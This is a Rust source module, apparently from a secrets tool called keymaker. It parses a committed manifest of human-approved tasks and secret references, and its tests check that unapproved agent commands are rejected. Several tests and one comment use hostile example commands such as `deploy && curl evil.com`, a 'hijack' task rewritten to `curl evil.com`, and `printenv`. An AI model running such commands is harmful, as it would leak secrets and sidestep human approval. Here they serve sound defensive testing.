//! The committed manifest.
//!
//! `.keymaker` holds names, never values: which tasks may run, and which
//! reference stands behind each environment variable. It is safe to commit,
//! and a fresh clone plus a machine that already has the secrets just works.
//!
//! Ad-hoc commands are allowed exactly once, through an approval that promotes
//! them into this file. After that the command is named, and the agent cannot
//! substitute `printenv` for a task a human approved.

use crate::error::{Error, Result};
use serde::{Deserialize, Serialize};
use std::collections::BTreeMap;

/// An environment entry: either a bare reference or one with flags.
#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
#[serde(untagged)]
pub enum Binding {
    Ref(String),
    Detailed {
        #[serde(rename = "ref")]
        reference: String,
        #[serde(default)]
        approve: bool,
    },
}

impl Binding {
    pub fn reference(&self) -> &str {
        match self {
            Binding::Ref(r) => r,
            Binding::Detailed { reference, .. } => reference,
        }
    }

    pub fn needs_approval(&self) -> bool {
        matches!(self, Binding::Detailed { approve: true, .. })
    }
}

#[derive(Debug, Clone, Default, PartialEq, Eq, Serialize, Deserialize)]
pub struct Environment {
    /// Another environment whose bindings this one inherits.
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub extends: Option<String>,
    #[serde(flatten)]
    pub bindings: BTreeMap<String, Binding>,
}

fn default_version() -> u32 {
    1
}

#[derive(Debug, Clone, Default, PartialEq, Eq, Serialize, Deserialize)]
pub struct Manifest {
    #[serde(default = "default_version")]
    pub version: u32,
    /// Task name -> the command it runs.
    #[serde(default)]
    pub tasks: BTreeMap<String, String>,
    #[serde(default)]
    pub env: BTreeMap<String, Environment>,
}

/// What an unapproved command would become if a human said yes.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct Proposal {
    pub name: String,
    pub command: String,
}

impl Proposal {
    /// The diff a human is asked to approve.
    pub fn snippet(&self) -> String {
        format!(
            "[tasks]\n{} = \"{}\"\n",
            self.name,
            self.command.replace('"', "\\\"")
        )
    }
}

/// A name derived from a command, for the approval prompt to suggest.
fn suggest_name(command: &str) -> String {
    let first = command.split_whitespace().next().unwrap_or("task");
    let base = first
        .rsplit('/')
        .next()
        .unwrap_or(first)
        .trim_end_matches(".sh")
        .trim_end_matches(".py");
    let cleaned: String = base
        .chars()
        .map(|c| {
            if c.is_ascii_alphanumeric() || c == '_' || c == '-' {
                c
            } else {
                '_'
            }
        })
        .collect();
    let cleaned = cleaned.trim_matches('_').to_string();
    if cleaned.is_empty() {
        "task".into()
    } else {
        cleaned
    }
}

impl Manifest {
    pub fn from_toml(src: &str) -> Result<Manifest> {
        let m: Manifest =
            toml::from_str(src).map_err(|e| Error::Parse(format!("manifest: {}", e)))?;
        if m.version != 1 {
            return Err(Error::Parse(format!(
                "manifest version {} is not supported",
                m.version
            )));
        }
        for (name, env) in &m.env {
            if let Some(parent) = &env.extends {
                if parent == name {
                    return Err(Error::Parse(format!(
                        "environment `{}` extends itself",
                        name
                    )));
                }
                if !m.env.contains_key(parent) {
                    return Err(Error::Parse(format!(
                        "environment `{}` extends `{}`, which does not exist",
                        name, parent
                    )));
                }
            }
        }
        // Reject inheritance cycles, which would otherwise loop at resolve time.
        for name in m.env.keys() {
            let mut seen = vec![name.clone()];
            let mut cur = name.clone();
            while let Some(parent) = m.env.get(&cur).and_then(|e| e.extends.clone()) {
                if seen.contains(&parent) {
                    return Err(Error::Parse(format!(
                        "environment inheritance cycle at `{}`",
                        parent
                    )));
                }
                seen.push(parent.clone());
                cur = parent;
            }
        }
        Ok(m)
    }

    pub fn to_toml(&self) -> Result<String> {
        toml::to_string_pretty(self).map_err(|e| Error::Parse(format!("manifest: {}", e)))
    }

    pub fn task(&self, name: &str) -> Result<&str> {
        self.tasks
            .get(name)
            .map(|s| s.as_str())
            .ok_or_else(|| Error::NotFound(format!("task `{}`", name)))
    }

    pub fn task_names(&self) -> Vec<&str> {
        self.tasks.keys().map(|s| s.as_str()).collect()
    }

    /// Whether this exact command is already approved. Comparison is on the
    /// whole command string: a task named `deploy` does not approve
    /// `deploy && curl evil.com`.
    pub fn approves(&self, command: &str) -> bool {
        self.tasks.values().any(|c| c == command)
    }

    /// What to show a human for an unapproved command. Returns `None` when the
    /// command is already approved and nothing needs asking.
    pub fn propose(&self, command: &str) -> Option<Proposal> {
        if self.approves(command) {
            return None;
        }
        let base = suggest_name(command);
        let mut name = base.clone();
        let mut n = 2;
        while self.tasks.contains_key(&name) {
            name = format!("{}{}", base, n);
            n += 1;
        }
        Some(Proposal {
            name,
            command: command.to_string(),
        })
    }

    /// Record an approval. Refuses to silently redefine an existing task.
    pub fn approve(&mut self, proposal: &Proposal) -> Result<()> {
        if let Some(existing) = self.tasks.get(&proposal.name) {
            if existing != &proposal.command {
                return Err(Error::Constraint(format!(
                    "task `{}` already runs a different command",
                    proposal.name
                )));
            }
            return Ok(());
        }
        self.tasks
            .insert(proposal.name.clone(), proposal.command.clone());
        Ok(())
    }

    /// Effective bindings for an environment, nearest definition winning.
    pub fn resolve_env(&self, name: &str) -> Result<BTreeMap<String, Binding>> {
        let mut chain = Vec::new();
        let mut cur = Some(name.to_string());
        while let Some(n) = cur {
            let env = self
                .env
                .get(&n)
                .ok_or_else(|| Error::NotFound(format!("environment `{}`", n)))?;
            chain.push(env);
            cur = env.extends.clone();
        }
        // Walk from the furthest ancestor inwards so nearer definitions win.
        let mut out = BTreeMap::new();
        for env in chain.iter().rev() {
            for (k, v) in &env.bindings {
                out.insert(k.clone(), v.clone());
            }
        }
        Ok(out)
    }

    /// Every reference an environment needs, for checking what is missing on
    /// this machine.
    pub fn refs_for(&self, env: &str) -> Result<Vec<String>> {
        Ok(self
            .resolve_env(env)?
            .values()
            .map(|b| b.reference().to_string())
            .collect())
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    const SRC: &str = r#"
version = 1

[tasks]
deploy = "./scripts/deploy.sh"
migrate = "prisma migrate deploy"

[env.default]
LOG_LEVEL = "app/log_level"
DATABASE_URL = "hardroad/db_url_dev"

[env.production]
extends = "default"
DATABASE_URL = "hardroad/db_url"
STRIPE_SECRET_KEY = { ref = "stripe/sk_live", approve = true }
"#;

    fn m() -> Manifest {
        Manifest::from_toml(SRC).unwrap()
    }

    #[test]
    fn tasks_are_looked_up_by_name() {
        assert_eq!(m().task("deploy").unwrap(), "./scripts/deploy.sh");
        assert!(matches!(m().task("nope"), Err(Error::NotFound(_))));
        assert_eq!(m().task_names(), vec!["deploy", "migrate"]);
    }

    #[test]
    fn an_approved_command_is_recognised_exactly() {
        let man = m();
        assert!(man.approves("./scripts/deploy.sh"));
        assert!(
            !man.approves("./scripts/deploy.sh && curl evil.com"),
            "an approved prefix must not approve a longer command"
        );
        assert!(!man.approves("printenv"));
    }

    #[test]
    fn an_unapproved_command_produces_a_proposal() {
        let man = m();
        let p = man.propose("./scripts/seed.sh --force").unwrap();
        assert_eq!(p.name, "seed");
        assert_eq!(p.command, "./scripts/seed.sh --force");
        assert!(p.snippet().contains("[tasks]"));
        assert!(p.snippet().contains("seed = \"./scripts/seed.sh --force\""));
    }

    #[test]
    fn an_approved_command_needs_no_proposal() {
        assert!(m().propose("./scripts/deploy.sh").is_none());
    }

    #[test]
    fn a_proposed_name_does_not_collide_with_an_existing_task() {
        let mut man = m();
        man.tasks.insert("seed".into(), "something-else".into());
        assert_eq!(man.propose("./scripts/seed.sh").unwrap().name, "seed2");
    }

    #[test]
    fn approving_promotes_the_command_into_the_manifest() {
        let mut man = m();
        let p = man.propose("pnpm test").unwrap();
        man.approve(&p).unwrap();
        assert!(man.approves("pnpm test"));
        assert!(
            man.propose("pnpm test").is_none(),
            "once approved, never asked again"
        );
    }

    #[test]
    fn approving_twice_is_harmless_but_redefining_is_refused() {
        let mut man = m();
        let p = Proposal {
            name: "deploy".into(),
            command: "./scripts/deploy.sh".into(),
        };
        assert!(
            man.approve(&p).is_ok(),
            "same command, same name is a no-op"
        );

        let hijack = Proposal {
            name: "deploy".into(),
            command: "curl evil.com".into(),
        };
        assert!(
            matches!(man.approve(&hijack), Err(Error::Constraint(_))),
            "an existing task must not be silently redefined"
        );
        assert_eq!(man.task("deploy").unwrap(), "./scripts/deploy.sh");
    }

    #[test]
    fn names_are_suggested_from_the_command() {
        assert_eq!(suggest_name("./scripts/deploy.sh"), "deploy");
        assert_eq!(suggest_name("prisma migrate deploy"), "prisma");
        assert_eq!(suggest_name("/usr/local/bin/my-tool --x"), "my-tool");
        assert_eq!(suggest_name("python3 x.py"), "python3");
        assert_eq!(suggest_name("///"), "task");
        assert_eq!(suggest_name(""), "task");
    }

    #[test]
    fn environments_inherit_and_override() {
        let env = m().resolve_env("production").unwrap();
        assert_eq!(
            env.get("LOG_LEVEL").unwrap().reference(),
            "app/log_level",
            "inherited"
        );
        assert_eq!(
            env.get("DATABASE_URL").unwrap().reference(),
            "hardroad/db_url",
            "overridden by the nearer definition"
        );
        assert_eq!(
            env.get("STRIPE_SECRET_KEY").unwrap().reference(),
            "stripe/sk_live"
        );
    }

    #[test]
    fn a_binding_can_demand_approval() {
        let env = m().resolve_env("production").unwrap();
        assert!(env.get("STRIPE_SECRET_KEY").unwrap().needs_approval());
        assert!(!env.get("LOG_LEVEL").unwrap().needs_approval());
    }

    #[test]
    fn refs_are_listed_for_checking_a_machine() {
        let mut refs = m().refs_for("production").unwrap();
        refs.sort();
        assert_eq!(
            refs,
            vec!["app/log_level", "hardroad/db_url", "stripe/sk_live"]
        );
    }

    #[test]
    fn an_unknown_environment_is_an_error() {
        assert!(matches!(
            m().resolve_env("staging"),
            Err(Error::NotFound(_))
        ));
    }

    #[test]
    fn a_manifest_containing_no_values_round_trips() {
        let man = m();
        let text = man.to_toml().unwrap();
        assert!(!text.contains("sk_live_"), "only references, never values");
        let back = Manifest::from_toml(&text).unwrap();
        assert_eq!(back, man);
    }

    #[test]
    fn bad_manifests_are_rejected() {
        assert!(matches!(
            Manifest::from_toml("version = 2"),
            Err(Error::Parse(_))
        ));

        let dangling = r#"
version = 1
[env.a]
extends = "ghost"
"#;
        assert!(matches!(
            Manifest::from_toml(dangling),
            Err(Error::Parse(_))
        ));

        let selfref = r#"
version = 1
[env.a]
extends = "a"
"#;
        assert!(matches!(Manifest::from_toml(selfref), Err(Error::Parse(_))));

        let cycle = r#"
version = 1
[env.a]
extends = "b"
[env.b]
extends = "a"
"#;
        assert!(
            matches!(Manifest::from_toml(cycle), Err(Error::Parse(_))),
            "a cycle must be caught at parse time, not loop at resolve time"
        );
    }

    #[test]
    fn an_empty_manifest_is_valid() {
        let man = Manifest::from_toml("version = 1").unwrap();
        assert!(man.tasks.is_empty());
        assert!(man.env.is_empty());
    }
}
